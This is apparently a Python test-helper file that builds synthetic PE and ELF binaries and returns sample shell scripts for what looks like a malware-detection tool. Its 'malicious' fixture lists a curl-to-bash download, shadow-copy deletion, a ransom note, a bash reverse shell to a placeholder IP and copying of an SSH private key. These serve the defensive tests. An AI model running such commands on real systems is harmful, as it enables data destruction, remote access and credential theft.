"""Test helpers: build synthetic binaries in memory so tests never need
network access or external sample files.
"""

from __future__ import annotations

import struct


def make_pe(is64: bool = False, sections: int = 3, subsystem: int = 3) -> bytes:
    """Construct a minimal but structurally valid PE image."""
    machine = 0x8664 if is64 else 0x14C
    opt_magic = 0x20B if is64 else 0x10B
    opt_size = 240 if is64 else 224

    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)

    coff = struct.pack("<HHIIIHH", machine, sections, 0x5F5E1000, 0, 0, opt_size, 0x0102)

    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, opt_magic)
    struct.pack_into("<I", opt, 16, 0x1000)  # AddressOfEntryPoint
    struct.pack_into("<Q" if is64 else "<I", opt, 24, 0x140000000 if is64 else 0x400000)
    struct.pack_into("<H", opt, 68, subsystem)
    struct.pack_into("<H", opt, 70, 0x0140 if is64 else 0x0140)  # ASLR + DEP
    num_dirs_off = 108 if is64 else 92
    dirs_off = 112 if is64 else 96
    struct.pack_into("<I", opt, num_dirs_off, 16)
    # one import directory entry
    struct.pack_into("<II", opt, dirs_off + 8, 0x2000, 0x100)

    headers = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt)

    sect_data = []
    names = [b".text", b".rdata", b".data", b".packed"]
    for i in range(sections):
        name = names[i % len(names)]
        body = (bytes([0x90 + i]) * 512) if i != sections - 1 else bytes((i * 37 + j) % 256 for j in range(1024))
        sect_data.append((name, 0x1000 * (i + 1), 0x400 + i * 0x200, body))

    raw_ptr = 0x400
    sect_table = b""
    payload = b""
    for name, vaddr, off, body in sect_data:
        raw_ptr = off
        flags = 0x60000020 if name in (b".text",) else (0xE0000020 if name == b".packed" else 0xC0000040)
        sect_table += struct.pack("<8sIIIIIIHHI", name.ljust(8, b"\x00"), len(body), vaddr, len(body), raw_ptr, 0, 0, 0, 0, flags)
        payload += b"\x00" * max(0, raw_ptr - (0x400 + len(sect_table) + len(payload))) + body

    image = headers + sect_table + payload
    return image


def make_elf(is64: bool = True) -> bytes:
    """Construct a minimal ELF with a section header table."""
    endian = "<"
    ehsize = 64 if is64 else 52
    data = bytearray(1024)
    data[0:4] = b"\x7fELF"
    data[4] = 2 if is64 else 1
    data[5] = 1  # little endian
    data[6] = 1  # version
    data[7] = 0  # SYSV
    if is64:
        struct.pack_into(endian + "HHIQQQIHHHHHH", data, 16,
                         2, 0x3E, 1, 0x1000, 0x40, 0x100, 0, ehsize, 56, 0, 64, 2, 1)
    else:
        struct.pack_into(endian + "HHIIIIIHHHHHH", data, 16,
                         2, 0x03, 1, 0x1000, 0x34, 0x100, 0, ehsize, 32, 0, 40, 2, 1)
    # section headers: null then .text
    shoff = 0x100
    struct.pack_into(endian + ("IIQQQQIIQQ" if is64 else "IIIIIIIIII"), data, shoff,
                     0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    struct.pack_into(endian + ("IIQQQQIIQQ" if is64 else "IIIIIIIIII"), data, shoff + (64 if is64 else 40),
                     0, 1, 0x6, 0, 0x200, 0x100, 0, 0, 16, 0)
    return bytes(data)


def make_script_malicious() -> bytes:
    return b"""#!/bin/sh
curl -fsSL http://10.0.0.9/x.sh | bash
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled no
echo "your files have been encrypted"
echo "send bitcoin to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
cp ~/.ssh/id_rsa /tmp/x
"""


def make_script_benign() -> bytes:
    return b"""#!/bin/sh
echo "hello world"
ls -la /var/log
gzip -k /var/log/app.log
"""
